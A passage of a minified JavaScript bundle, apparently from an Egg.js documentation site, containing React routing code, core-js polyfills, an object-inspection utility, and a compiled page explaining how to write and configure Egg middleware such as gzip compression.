a=e.props.path||e.props.from;c=a?r.matchPath(i.pathname,d(d({},e.props),{},{path:a})):t.match}})),c?l.cloneElement(n,{location:i,computedMatch:c,layoutProps:o}):null}))}var L=["component"];function T(e,t){e.component;var n=E(e,L),o=e.component;function i(i){var c=l.useState((function(){return window.g_initialProps})),u=b(c,2),m=u[0],h=u[1];return l.useEffect((function(){var l=function(){var l=p(a().mark((function l(){var c,s,u,m,p;return a().wrap((function(a){while(1)switch(a.prev=a.next){case 0:if(s=o,!o.preload){a.next=6;break}return a.next=4,o.preload();case 4:s=a.sent,s=s["default"]||s;case 6:if(u=d(d({isServer:!1,match:null===i||void 0===i?void 0:i.match,history:null===i||void 0===i?void 0:i.history,route:e},t.getInitialPropsCtx||{}),n),!(null===(c=s)||void 0===c?void 0:c.getInitialProps)){a.next=15;break}return a.next=10,t.plugin.applyPlugins({key:"ssr.modifyGetInitialPropsCtx",type:r.ApplyPluginsType.modify,initialValue:u,async:!0});case 10:return m=a.sent,a.next=13,s.getInitialProps(m||u);case 13:p=a.sent,h(p);case 15:case"end":return a.stop()}}),l)})));return function(){return l.apply(this,arguments)}}();window.g_initialProps||l()}),[window.location.pathname,window.location.search]),s["default"].createElement(o,g({},i,m))}return i.wrapInitialPropsLoaded=!0,i.displayName="ComponentWithInitialPropsFetch",i}function N(e){var t=e.route,n=e.opts,a=e.props,r=I(d(d({},n),{},{routes:t.routes||[],rootRoutes:n.rootRoutes}),{location:a.location}),o=t.component,i=t.wrappers;if(o){var c=n.isServer?{}:window.g_initialProps,u=d(d(d(d({},a),n.extraProps),n.pageInitialProps||c),{},{route:t,routes:n.rootRoutes}),m=s["default"].createElement(o,u,r);if(i){var p=i.length-1;while(p>=0)m=l.createElement(i[p],u,m),p-=1}return m}return r}function O(e){var t,n,a,l=e.route,o=e.index,i=e.opts,c={key:l.key||o,exact:l.exact,strict:l.strict,sensitive:l.sensitive,path:l.path};return l.redirect?s["default"].createElement(r.Redirect,g({},c,{from:l.path,to:l.redirect})):(!i.ssrProps||i.isServer||(null===(t=l.component)||void 0===t?void 0:t.wrapInitialPropsLoaded)||!(null===(n=l.component)||void 0===n?void 0:n.getInitialProps)&&!(null===(a=l.component)||void 0===a?void 0:a.preload)||(l.component=T(l,i)),s["default"].createElement(S,g({},c,{render:function(e){return N({route:l,opts:i,props:e})}})))}function I(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return e.routes?s["default"].createElement(A,t,e.routes.map((function(t,n){return O({route:t,index:n,opts:d(d({},e),{},{rootRoutes:e.rootRoutes||e.routes})})}))):null}var P=["history"];function R(e){var t=e.history,n=E(e,P);return l.useEffect((function(){function a(t,a){var l=arguments.length>2&&void 0!==arguments[2]&&arguments[2],o=i.matchRoutes(e.routes,t.pathname);"undefined"!==typeof document&&void 0!==n.defaultTitle&&(document.title=o.length&&o[o.length-1].route.title||n.defaultTitle||""),e.plugin.applyPlugins({key:"onRouteChange",type:r.ApplyPluginsType.event,args:{routes:e.routes,matchedRoutes:o,location:t,action:a,isFirst:l}})}return window.g_useSSR&&(window.g_initialProps=null),a(t.location,"POP",!0),t.listen(a)}),[t]),s["default"].createElement(r.Router,{history:t},I(n))}function _(e){return e.plugin.applyPlugins({type:r.ApplyPluginsType.modify,key:"rootContainer",initialValue:s["default"].createElement(R,{history:e.history,routes:e.routes,plugin:e.plugin,ssrProps:e.ssrProps,defaultTitle:e.defaultTitle}),args:{history:e.history,routes:e.routes,plugin:e.plugin}})}function q(e){return M.apply(this,arguments)}function M(){return M=p(a().mark((function e(t){var n,r,l,o,c,s,u,d,m=arguments;return a().wrap((function(e){while(1)switch(e.prev=e.next){case 0:n=m.length>1&&void 0!==m[1]?m[1]:window.location.pathname,r=i.matchRoutes(t,n),l=j(r),e.prev=3,l.s();case 5:if((o=l.n()).done){e.next=19;break}if(s=o.value,u=s.route,"string"===typeof u.component||!(null===(c=u.component)||void 0===c?void 0:c.preload)){e.next=13;break}return e.next=11,u.component.preload();case 11:d=e.sent,u.component=d["default"]||d;case 13:if(!u.routes){e.next=17;break}return e.next=16,q(u.routes,n);case 16:u.routes=e.sent;case 17:e.next=5;break;case 19:e.next=24;break;case 21:e.prev=21,e.t0=e["catch"](3),l.e(e.t0);case 24:return e.prev=24,l.f(),e.finish(24);case 27:return e.abrupt("return",t);case 28:case"end":return e.stop()}}),e,null,[[3,21,24,27]])}))),M.apply(this,arguments)}function F(e){var t=_(e);if(!e.rootElement)return t;var n="string"===typeof e.rootElement?document.getElementById(e.rootElement):e.rootElement,a=e.callback||function(){};window.g_useSSR?e.dynamicImport?q(e.routes).then((function(){o.hydrate(t,n,a)})):o.hydrate(t,n,a):o.render(t,n,a)}t.renderClient=F,t.renderRoutes=I},PCpU:function(e,t,n){"use strict";var a=n("0mt+"),r=n("tS9j"),l=n("vyxk"),o=n("zKw/"),i=n("q7Pv"),c=n("m4/z"),s=i("replace"),u=RegExp.prototype;a({target:"String",proto:!0},{replaceAll:function e(t,n){var a,i,d,m,p,h,g,f,E,b=r(this);if(null!=t){if(a=l(t),a&&(i=String(r("flags"in u?t.flags:o.call(t))),!~i.indexOf("g")))throw TypeError("`.replaceAll` does not allow non-global regexes");if(d=t[s],void 0!==d)return d.call(t,b,n);if(c&&a)return String(b).replace(t,n)}if(m=String(b),p=String(t),""===p)return e.call(m,/(?:)/g,n);if(h=m.split(p),"function"!==typeof n)return h.join(String(n));for(g=h[0],f=g.length,E=1;E<h.length;E++)g+=String(n(p,f,m)),f+=p.length+h[E].length,g+=h[E];return g}})},PE0O:function(e,t,n){"use strict";n.d(t,"a",(function(){return c}));var a=n("FU0I"),r=n.n(a),l=n("kqhb"),o=n.n(l);function i(e){return e instanceof HTMLElement||e instanceof SVGElement}function c(e){return i(e)?e:e instanceof r.a.Component?o.a.findDOMNode(e):null}},PE5i:function(e,t,n){var a=n("a7jj");e.exports=function(e,t){if(!a(e))return e;var n,r;if(t&&"function"==typeof(n=e.toString)&&!a(r=n.call(e)))return r;if("function"==typeof(n=e.valueOf)&&!a(r=n.call(e)))return r;if(!t&&"function"==typeof(n=e.toString)&&!a(r=n.call(e)))return r;throw TypeError("Can't convert object to primitive value")}},PGq4:function(e,t,n){var a=n("0mt+"),r=n("A0UU");a({global:!0},{globalThis:r})},"PM/J":function(e,t,n){var a="function"===typeof Map&&Map.prototype,r=Object.getOwnPropertyDescriptor&&a?Object.getOwnPropertyDescriptor(Map.prototype,"size"):null,l=a&&r&&"function"===typeof r.get?r.get:null,o=a&&Map.prototype.forEach,i="function"===typeof Set&&Set.prototype,c=Object.getOwnPropertyDescriptor&&i?Object.getOwnPropertyDescriptor(Set.prototype,"size"):null,s=i&&c&&"function"===typeof c.get?c.get:null,u=i&&Set.prototype.forEach,d="function"===typeof WeakMap&&WeakMap.prototype,m=d?WeakMap.prototype.has:null,p="function"===typeof WeakSet&&WeakSet.prototype,h=p?WeakSet.prototype.has:null,g="function"===typeof WeakRef&&WeakRef.prototype,f=g?WeakRef.prototype.deref:null,E=Boolean.prototype.valueOf,b=Object.prototype.toString,v=Function.prototype.toString,y=String.prototype.match,k=String.prototype.slice,w=String.prototype.replace,x=String.prototype.toUpperCase,j=String.prototype.toLowerCase,S=RegExp.prototype.test,C=Array.prototype.concat,A=Array.prototype.join,L=Array.prototype.slice,T=Math.floor,N="function"===typeof BigInt?BigInt.prototype.valueOf:null,O=Object.getOwnPropertySymbols,I="function"===typeof Symbol&&"symbol"===typeof Symbol.iterator?Symbol.prototype.toString:null,P="function"===typeof Symbol&&"object"===typeof Symbol.iterator,R="function"===typeof Symbol&&Symbol.toStringTag&&(typeof Symbol.toStringTag===P||"symbol")?Symbol.toStringTag:null,_=Object.prototype.propertyIsEnumerable,q=("function"===typeof Reflect?Reflect.getPrototypeOf:Object.getPrototypeOf)||([].__proto__===Array.prototype?function(e){return e.__proto__}:null);function M(e,t){if(e===1/0||e===-1/0||e!==e||e&&e>-1e3&&e<1e3||S.call(/e/,t))return t;var n=/[0-9](?=(?:[0-9]{3})+(?![0-9]))/g;if("number"===typeof e){var a=e<0?-T(-e):T(e);if(a!==e){var r=String(a),l=k.call(t,r.length+1);return w.call(r,n,"$&_")+"."+w.call(w.call(l,/([0-9]{3})/g,"$&_"),/_$/,"")}}return w.call(t,n,"$&_")}var F=n(1),D=F.custom,U=K(D)?D:null;function z(e,t,n){var a="double"===(n.quoteStyle||t)?'"':"'";return a+e+a}function H(e){return w.call(String(e),/"/g,"&quot;")}function B(e){return"[object Array]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function W(e){return"[object Date]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function V(e){return"[object RegExp]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function $(e){return"[object Error]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function G(e){return"[object String]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function X(e){return"[object Number]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function Q(e){return"[object Boolean]"===ee(e)&&(!R||!("object"===typeof e&&R in e))}function K(e){if(P)return e&&"object"===typeof e&&e instanceof Symbol;if("symbol"===typeof e)return!0;if(!e||"object"!==typeof e||!I)return!1;try{return I.call(e),!0}catch(t){}return!1}function J(e){if(!e||"object"!==typeof e||!N)return!1;try{return N.call(e),!0}catch(t){}return!1}e.exports=function e(t,n,a,r){var i=n||{};if(Z(i,"quoteStyle")&&"single"!==i.quoteStyle&&"double"!==i.quoteStyle)throw new TypeError('option "quoteStyle" must be "single" or "double"');if(Z(i,"maxStringLength")&&("number"===typeof i.maxStringLength?i.maxStringLength<0&&i.maxStringLength!==1/0:null!==i.maxStringLength))throw new TypeError('option "maxStringLength", if provided, must be a positive integer, Infinity, or `null`');var c=!Z(i,"customInspect")||i.customInspect;if("boolean"!==typeof c&&"symbol"!==c)throw new TypeError("option \"customInspect\", if provided, must be `true`, `false`, or `'symbol'`");if(Z(i,"indent")&&null!==i.indent&&"\t"!==i.indent&&!(parseInt(i.indent,10)===i.indent&&i.indent>0))throw new TypeError('option "indent" must be "\\t", an integer > 0, or `null`');if(Z(i,"numericSeparator")&&"boolean"!==typeof i.numericSeparator)throw new TypeError('option "numericSeparator", if provided, must be `true` or `false`');var d=i.numericSeparator;if("undefined"===typeof t)return"undefined";if(null===t)return"null";if("boolean"===typeof t)return t?"true":"false";if("string"===typeof t)return se(t,i);if("number"===typeof t){if(0===t)return 1/0/t>0?"0":"-0";var m=String(t);return d?M(t,m):m}if("bigint"===typeof t){var p=String(t)+"n";return d?M(t,p):p}var h="undefined"===typeof i.depth?5:i.depth;if("undefined"===typeof a&&(a=0),a>=h&&h>0&&"object"===typeof t)return B(t)?"[Array]":"[Object]";var g=ge(i,a);if("undefined"===typeof r)r=[];else if(ne(r,t)>=0)return"[Circular]";function f(t,n,l){if(n&&(r=L.call(r),r.push(n)),l){var o={depth:i.depth};return Z(i,"quoteStyle")&&(o.quoteStyle=i.quoteStyle),e(t,o,a+1,r)}return e(t,i,a+1,r)}if("function"===typeof t&&!V(t)){var b=te(t),v=Ee(t,f);return"[Function"+(b?": "+b:" (anonymous)")+"]"+(v.length>0?" { "+A.call(v,", ")+" }":"")}if(K(t)){var y=P?w.call(String(t),/^(Symbol\(.*\))_[^)]*$/,"$1"):I.call(t);return"object"!==typeof t||P?y:de(y)}if(ce(t)){for(var x="<"+j.call(String(t.nodeName)),S=t.attributes||[],T=0;T<S.length;T++)x+=" "+S[T].name+"="+z(H(S[T].value),"double",i);return x+=">",t.childNodes&&t.childNodes.length&&(x+="..."),x+="</"+j.call(String(t.nodeName))+">",x}if(B(t)){if(0===t.length)return"[]";var O=Ee(t,f);return g&&!he(O)?"["+fe(O,g)+"]":"[ "+A.call(O,", ")+" ]"}if($(t)){var D=Ee(t,f);return"cause"in Error.prototype||!("cause"in t)||_.call(t,"cause")?0===D.length?"["+String(t)+"]":"{ ["+String(t)+"] "+A.call(D,", ")+" }":"{ ["+String(t)+"] "+A.call(C.call("[cause]: "+f(t.cause),D),", ")+" }"}if("object"===typeof t&&c){if(U&&"function"===typeof t[U]&&F)return F(t,{depth:h-a});if("symbol"!==c&&"function"===typeof t.inspect)return t.inspect()}if(ae(t)){var Y=[];return o&&o.call(t,(function(e,n){Y.push(f(n,t,!0)+" => "+f(e,t))})),pe("Map",l.call(t),Y,g)}if(oe(t)){var ue=[];return u&&u.call(t,(function(e){ue.push(f(e,t))})),pe("Set",s.call(t),ue,g)}if(re(t))return me("WeakMap");if(ie(t))return me("WeakSet");if(le(t))return me("WeakRef");if(X(t))return de(f(Number(t)));if(J(t))return de(f(N.call(t)));if(Q(t))return de(E.call(t));if(G(t))return de(f(String(t)));if(!W(t)&&!V(t)){var be=Ee(t,f),ve=q?q(t)===Object.prototype:t instanceof Object||t.constructor===Object,ye=t instanceof Object?"":"null prototype",ke=!ve&&R&&Object(t)===t&&R in t?k.call(ee(t),8,-1):ye?"Object":"",we=ve||"function"!==typeof t.constructor?"":t.constructor.name?t.constructor.name+" ":"",xe=we+(ke||ye?"["+A.call(C.call([],ke||[],ye||[]),": ")+"] ":"");return 0===be.length?xe+"{}":g?xe+"{"+fe(be,g)+"}":xe+"{ "+A.call(be,", ")+" }"}return String(t)};var Y=Object.prototype.hasOwnProperty||function(e){return e in this};function Z(e,t){return Y.call(e,t)}function ee(e){return b.call(e)}function te(e){if(e.name)return e.name;var t=y.call(v.call(e),/^function\s*([\w$]+)/);return t?t[1]:null}function ne(e,t){if(e.indexOf)return e.indexOf(t);for(var n=0,a=e.length;n<a;n++)if(e[n]===t)return n;return-1}function ae(e){if(!l||!e||"object"!==typeof e)return!1;try{l.call(e);try{s.call(e)}catch(t){return!0}return e instanceof Map}catch(n){}return!1}function re(e){if(!m||!e||"object"!==typeof e)return!1;try{m.call(e,m);try{h.call(e,h)}catch(t){return!0}return e instanceof WeakMap}catch(n){}return!1}function le(e){if(!f||!e||"object"!==typeof e)return!1;try{return f.call(e),!0}catch(t){}return!1}function oe(e){if(!s||!e||"object"!==typeof e)return!1;try{s.call(e);try{l.call(e)}catch(t){return!0}return e instanceof Set}catch(n){}return!1}function ie(e){if(!h||!e||"object"!==typeof e)return!1;try{h.call(e,h);try{m.call(e,m)}catch(t){return!0}return e instanceof WeakSet}catch(n){}return!1}function ce(e){return!(!e||"object"!==typeof e)&&("undefined"!==typeof HTMLElement&&e instanceof HTMLElement||"string"===typeof e.nodeName&&"function"===typeof e.getAttribute)}function se(e,t){if(e.length>t.maxStringLength){var n=e.length-t.maxStringLength,a="... "+n+" more character"+(n>1?"s":"");return se(k.call(e,0,t.maxStringLength),t)+a}var r=w.call(w.call(e,/(['\\])/g,"\\$1"),/[\x00-\x1f]/g,ue);return z(r,"single",t)}function ue(e){var t=e.charCodeAt(0),n={8:"b",9:"t",10:"n",12:"f",13:"r"}[t];return n?"\\"+n:"\\x"+(t<16?"0":"")+x.call(t.toString(16))}function de(e){return"Object("+e+")"}function me(e){return e+" { ? }"}function pe(e,t,n,a){var r=a?fe(n,a):A.call(n,", ");return e+" ("+t+") {"+r+"}"}function he(e){for(var t=0;t<e.length;t++)if(ne(e[t],"\n")>=0)return!1;return!0}function ge(e,t){var n;if("\t"===e.indent)n="\t";else{if(!("number"===typeof e.indent&&e.indent>0))return null;n=A.call(Array(e.indent+1)," ")}return{base:n,prev:A.call(Array(t+1),n)}}function fe(e,t){if(0===e.length)return"";var n="\n"+t.prev+t.base;return n+A.call(e,","+n)+"\n"+t.prev}function Ee(e,t){var n=B(e),a=[];if(n){a.length=e.length;for(var r=0;r<e.length;r++)a[r]=Z(e,r)?t(e[r],e):""}var l,o="function"===typeof O?O(e):[];if(P){l={};for(var i=0;i<o.length;i++)l["$"+o[i]]=o[i]}for(var c in e)Z(e,c)&&(n&&String(Number(c))===c&&c<e.length||P&&l["$"+c]instanceof Symbol||(S.call(/[^\w$]/,c)?a.push(t(c,e)+": "+t(e[c],e)):a.push(c+": "+t(e[c],e))));if("function"===typeof O)for(var s=0;s<o.length;s++)_.call(e,o[s])&&a.push("["+t(o[s])+"]: "+t(e[o[s]],e));return a}},POLX:function(e,t,n){"use strict";var a=n("FU0I"),r=n.n(a);n("G01i");function l(){return l=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},l.apply(this,arguments)}t["a"]=function(e){return r.a.createElement("div",l({className:"__dumi-default-alert"},e))}},POO6:function(e,t,n){var a=n("0mt+"),r=n("NBU9"),l=n("ESQ9");a({target:"Object",stat:!0},{fromEntries:function(e){var t={};return r(e,(function(e,n){l(t,e,n)}),void 0,!0),t}})},PdaW:function(e,t,n){var a=n("0mt+"),r=n("kPJt");a({target:"Object",stat:!0,forced:Object.assign!==r},{assign:r})},Pgx2:function(e,t,n){var a=n("q7Pv"),r=a("match");e.exports=function(e){var t=/./;try{"/./"[e](t)}catch(n){try{return t[r]=!1,"/./"[e](t)}catch(a){}}return!1}},PiIT:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("FU0I"),r=n.n(a),l=r.a.createContext({})},Pydy:function(e,t,n){},"Q+FJ":function(e,t,n){"use strict";var a=n("a7jj"),r=n("u3TI"),l=n("Yftc"),o=n("q7Pv"),i=o("hasInstance"),c=Function.prototype;i in c||r.f(c,i,{value:function(e){if("function"!=typeof this||!a(e))return!1;if(!a(this.prototype))return e instanceof this;while(e=l(e))if(this.prototype===e)return!0;return!1}})},QDLP:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"In ",r.a.createElement(l["Link"],{to:"../intro/egg-and-koa"},"the previous chapter"),", we say that Egg is based on Koa, so the form of middleware in Egg is the same as in Koa, i.e. they are both based on ",r.a.createElement(l["AnchorLink"],{to:"../intro/egg-and-koa#middleware"},"the onion model"),"."),r.a.createElement("h2",{id:"writing-middleware"},r.a.createElement(l["AnchorLink"],{to:"#writing-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Writing Middleware"),r.a.createElement("h3",{id:"how-to-write"},r.a.createElement(l["AnchorLink"],{to:"#how-to-write","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Write"),r.a.createElement("p",null,"Let's take a look at how to write a middleware from a simple gzip example."),r.a.createElement(o["a"],{code:"const isJSON = require('koa-is-json');\nconst zlib = require('zlib');\n\nasync function gzip(ctx, next) {\n  await next();\n\n  // convert the response body to gzip after the completion of the execution of subsequent middleware\n  let body = ctx.body;\n  if (!body) return;\n  if (isJSON(body)) body = JSON.stringify(body);\n\n  // set gzip body, correct the response header\n  const stream = zlib.createGzip();\n  stream.end(body);\n  ctx.body = stream;\n  ctx.set('Content-Encoding', 'gzip');\n}",lang:"js"}),r.a.createElement("p",null,"You might find that the middleware's style in the framework is exactly the same as in Koa, yes, any middleware in Koa can be used directly by the framework."),r.a.createElement("h3",{id:"configuration"},r.a.createElement(l["AnchorLink"],{to:"#configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement("p",null,"Usually the middleware has its own configuration. In the framework, a complete middleware includes the configuration process. A middleware is a single file placed under ",r.a.createElement("code",null,"app/middleware")," directory, which needs to exports a function that accepts two parameters:"),r.a.createElement("ul",null,r.a.createElement("li",null,"options: the configuration field of the middleware, ",r.a.createElement("code",null,"app.config[$","{","middlewareName","}","]")," will be passed in by the framework"),r.a.createElement("li",null,"app: the Application instance of current application")),r.a.createElement("p",null,"We will do a simple optimization to the gzip middleware above, making it do gzip compression only if the body size is greater than a configured threshold. So, we need to create a new file ",r.a.createElement("code",null,"gzip.js")," in ",r.a.createElement("code",null,"app/middleware")," directory."),r.a.createElement(o["a"],{code:"// app/middleware/gzip.js\nconst isJSON = require('koa-is-json');\nconst zlib = require('zlib');\n\nmodule.exports = (options) => {\n  return async function gzip(ctx, next) {\n    await next();\n\n    // convert the response body to gzip after the completion of the execution of subsequent middleware\n    let body = ctx.body;\n    if (!body) return;\n\n    // support options.threshold\n    if (options.threshold && ctx.length < options.threshold) return;\n\n    if (isJSON(body)) body = JSON.stringify(body);\n\n    // set gzip body, correct the response header\n    const stream = zlib.createGzip();\n    stream.end(body);\n    ctx.body = stream;\n    ctx.set('Content-Encoding', 'gzip');\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"using-middleware"},r.a.createElement(l["AnchorLink"],{to:"#using-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Middleware"),r.a.createElement("p",null,"After writing middleware, we also need to mount it, there are following ways to support:"),r.a.createElement("h3",{id:"using-middleware-in-application"},r.a.createElement(l["AnchorLink"],{to:"#using-middleware-in-application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Middleware in Application"),r.a.createElement("p",null,"We can load customized middleware completely by configuration in the application, and decide their order. If we need to load the gzip middleware in the above, we can edit ",r.a.createElement("code",null,"config.default.js")," like this:"),r.a.createElement(o["a"],{code:"module.exports = {\n  // configure the middleware you need, which loads in the order of array\n  middleware: ['gzip'],\n\n  // configure the gzip middleware\n  gzip: {\n    threshold: 1024, // skip response body which size is less than 1K\n  },\n};",lang:"js"}),r.a.createElement("p",null,"This config will be merged to ",r.a.createElement("code",null,"app.config.appMiddleware")," at starting up."),r.a.createElement("h2",{id:"using-middleware-in-framework-and-plugin"},r.a.createElement(l["AnchorLink"],{to:"#using-middleware-in-framework-and-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Middleware in Framework and Plugin"),r.a.createElement("p",null,"Framework and Plugin don't support to configure ",r.a.createElement("code",null,"middleware")," in ",r.a.createElement("code",null,"config.default.js"),", you should mount it in ",r.a.createElement("code",null,"app.js"),":"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // put to the first place to count request cost\n  app.config.coreMiddleware.unshift('report');\n};\n\n// app/middleware/report.js\nmodule.exports = () => {\n  return async function (ctx, next) {\n    const startTime = Date.now();\n    await next();\n    reportTime(Date.now() - startTime);\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Middlewares which are defined at Application (",r.a.createElement("code",null,"app.config.appMiddleware"),") and Framework(",r.a.createElement("code",null,"app.config.coreMiddleware"),") will be merged to ",r.a.createElement("code",null,"app.middleware")," by loader at staring up."),r.a.createElement("h2",{id:"using-middleware-in-router"},r.a.createElement(l["AnchorLink"],{to:"#using-middleware-in-router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Middleware in Router"),r.a.createElement("p",null,"The middleware configured in the above ways is global, and it will process every request."),r.a.createElement("p",null,"If you do want to take effect only for single route, you could just instantiate and mount it at ",r.a.createElement("code",null,"app/router.js"),":"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  const gzip = app.middleware.gzip({ threshold: 1024 });\n  app.router.get('/needgzip', gzip, app.controller.handler);\n};",lang:"js"}),r.a.createElement("h2",{id:"default-framework-middleware"},r.a.createElement(l["AnchorLink"],{to:"#default-framework-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Default Framework Middleware"),r.a.createElement("p",null,"In addition to application layer loading middleware, the framework itself and other plugins will also load many middlewares. All the config fields of these built-in middlewares can be modified by modifying the ones with the same name in the config file, for example ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/tree/master/app/middleware"},"Framework Built-in Plugin")," uses a bodyParser middleware(the framework loader will change the various delimiters in the file name into the camel style), and we can add configs below in ",r.a.createElement("code",null,"config/config.default.js")," to modify the bodyParser:"),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    jsonLimit: '10m',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"** Note: middleware loaded by the framework and plugins are loaded earlier than those loaded by the application layer, and the application-layer middleware cannot overwrite the default framework middleware. If the application layer loads customized middleware that has the same name with default framework middleware, an error will be reported on starting up. **"),r.a.createElement("h2",{id:"use-koas-middleware"},r.a.createElement(l["AnchorLink"],{to:"#use-koas-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use Koa's Middleware"),r.a.createElement("p",null,"Developer is free to use Koa Middleware, all middlewares used in Koa can be directly used in the framework too."),r.a.createElement("p",null,"For example, Koa uses ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/compress"},"koa-compress")," in this way:"),r.a.createElement(o["a"],{code:"const koa = require('koa');\nconst compress = require('koa-compress');\n\nconst app = koa();\n\nconst options = { threshold: 2048 };\napp.use(compress(options));",lang:"js"}),r.a.createElement("p",null,"We can load the middleware according to the framework specification like this:"),r.a.createElement(o["a"],{code:"// app/middleware/compress.js\n// interfaces(`(options) => middleware`) exposed by koa-compress match the framework middleware requirements\nmodule.exports = require('koa-compress');",lang:"js"}),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  middleware: ['compress'],\n  compress: {\n    threshold: 2048,\n  },\n};",lang:"js"}),r.a.createElement("p",null,"If the third-party Koa middleware do not follow the rule, then you can wrap it yourself:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  webpack: {\n    compiler: {},\n    others: {},\n  },\n};\n\n// app/middleware/webpack.js\nconst webpackMiddleware = require('some-koa-middleware');\n\nmodule.exports = (options, app) => {\n  return webpackMiddleware(options.compiler, options.others);\n};",lang:"js"}),r.a.createElement("h2",{id:"general-configuration"},r.a.createElement(l["AnchorLink"],{to:"#general-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"General Configuration"),r.a.createElement("p",null,"These general config fields are supported by middleware loaded by the application layer and built in by the framework:"),r.a.createElement("ul",null,r.a.createElement("li",null,"enable: enable the middleware or not"),r.a.createElement("li",null,"match: set some rules with which only the request matches can go through this middleware"),r.a.createElement("li",null,"ignore: set some rules with which the request matches can't go through this middleware")),r.a.createElement("h3",{id:"enable"},r.a.createElement(l["AnchorLink"],{to:"#enable","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"enable"),r.a.createElement("p",null,"If our application does not need default bodyParser to resolve the request body, we can configure enable for false to close it."),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    enable: false,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"match-and-ignore"},r.a.createElement(l["AnchorLink"],{to:"#match-and-ignore","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"match")," and ",r.a.createElement("code",null,"ignore")),r.a.createElement("p",null,"match and ignore share the same parameter but do the opposite things. match and ignore cannot be configured in the same time."),r.a.createElement("p",null,"If we want gzip to be used only by url requests starting with ",r.a.createElement("code",null,"/static"),", the match config field can be set like this:"),r.a.createElement(o["a"],{code:"module.exports = {\n  gzip: {\n    match: '/static',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"match and ignore support various types of configuration ways:"),r.a.createElement("ol",null,r.a.createElement("li",null,"String: when string, it sets the prefix of a url path, and all urls starting with this prefix will be matched. A string array is also accepted."),r.a.createElement("li",null,"Regular expression: when regular expression, all urls satisfy this regular expression will be matched."),r.a.createElement("li",null,"Function: when function, the request context will be passed to it and what it returns(true/false) determines whether the request is matched or not.")),r.a.createElement(o["a"],{code:"module.exports = {\n  gzip: {\n    match(ctx) {\n      // enabled on ios devices\n      const reg = /iphone|ipad|ipod/i;\n      return reg.test(ctx.get('user-agent'));\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"For more configs about ",r.a.createElement("code",null,"match")," and ",r.a.createElement("code",null,"ignore"),", please refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-path-matching"},"egg-path-matching"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},QNwx:function(e,t,n){var a=n("lMVt"),r=Object.prototype,l=r.hasOwnProperty,o=r.toString,i=a?a.toStringTag:void 0;function c(e){var t=l.call(e,i),n=e[i];try{e[i]=void 0;var a=!0}catch(c){}var r=o.call(e);return a&&(t?e[i]=n:delete e[i]),r}e.exports=c},QRVW:function(e,t,n){},QWDv:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.toKey,i=r.set;a({target:"Reflect",stat:!0},{metadata:function(e,t){return function(n,a){i(e,t,l(n),o(a))}}})},QdIm:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return 